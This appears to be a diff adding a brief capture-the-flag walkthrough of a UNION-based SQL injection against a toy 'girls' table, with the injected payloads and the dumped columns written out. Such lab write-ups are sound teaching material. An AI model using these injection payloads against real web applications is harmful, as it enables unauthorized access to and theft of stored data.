@@ -1,0 +1,26 @@
+As always push "Request" button and watch what sort of request is it:
+"Request is: SELECT * FROM girls WHERE name='Madoka' AND height=''"
+
+Table:
+-------------------------
+id	name	height	secret
+-------------------------
+
+All fields are empty. So lets play with requests and use querying.
+Input:
+228' union select 1,2,3,4 from girls where name = 'Madoka
+
+Why 1,2,3,4 combination?
+I tried to do this to check for existing table elements.
+
+This is what i got:
+
+Result:
+-------------------------
+id	name	height	secret
+1	    2   	3	      4
+
+All columns exist!
+Now full rq:
+228' union select * from girls where name = 'Madoka
+----------------------------------------------------
